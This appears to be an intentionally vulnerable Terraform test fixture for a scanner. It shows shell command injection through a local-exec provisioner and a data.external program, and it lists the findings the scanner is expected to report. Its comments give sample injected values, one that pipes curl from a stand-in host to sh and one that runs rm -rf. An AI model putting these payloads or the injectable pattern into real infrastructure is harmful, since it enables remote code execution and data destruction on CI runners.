# OWASP A03:2021 — Injection
# Cloud: GCP
#
# Terraform injection vectors are subtler than web-app injection but
# real:
#
#   1. `provisioner "local-exec"` and `null_resource` invoking shell
#      with unvalidated values. Whatever the operator typed into a
#      tfvar lands in `bash -c` after string interpolation — classic
#      command injection.
#   2. `data "external"` runs an arbitrary program at plan time. If
#      its `program` argument is constructed from user input, the
#      planner becomes a remote-code-execution surface. If its
#      `query` is user-controlled, the underlying program may be
#      injected via a malicious key/value pair.
#
# Real-world impact:
#   - A malicious tfvar (`var.app_name = "; curl evil.sh | sh"`) ends
#     up executing on the operator's workstation or CI runner.
#   - `data.external` programs that don't validate stdin inputs leak
#     the entire CI environment to an attacker who controls the
#     query map.
#
# Expected tf-analyze findings:
#   - SEC-PROVISIONER-001  HIGH    Provisioner block used for shell execution
#   - SEC-DATASOURCE-001   MEDIUM  External or HTTP data source executes at plan time
#   - SEC-DATASOURCE-002   HIGH    data.external program takes user-controlled input
#
# Fix summary: keep provisioners out of Terraform — use cloud-init,
# Packer, or a config management tool for VM bootstrap. If a
# `data.external` is unavoidable, hard-code the program path and
# refuse non-literal arguments.

variable "app_name" {
  description = "Application name; trusted prefix used in resource naming."
  type        = string
}

resource "null_resource" "shell_injectable" {
  provisioner "local-exec" {
    # var.app_name is interpolated into a shell context unsanitised.
    # An attacker who controls tfvars can append `; rm -rf /` here.
    command = "echo deploying ${var.app_name} && /opt/deploy.sh ${var.app_name}"
  }
}

# data.external invokes an arbitrary program at plan time. The
# `query` map is passed as JSON on stdin — if the program shells out
# to that input, this is RCE.
data "external" "user_query" {
  program = ["/usr/bin/env", "bash", "-c", "/usr/local/bin/unsafe-helper.sh"]
  query = {
    raw = var.app_name
  }
}
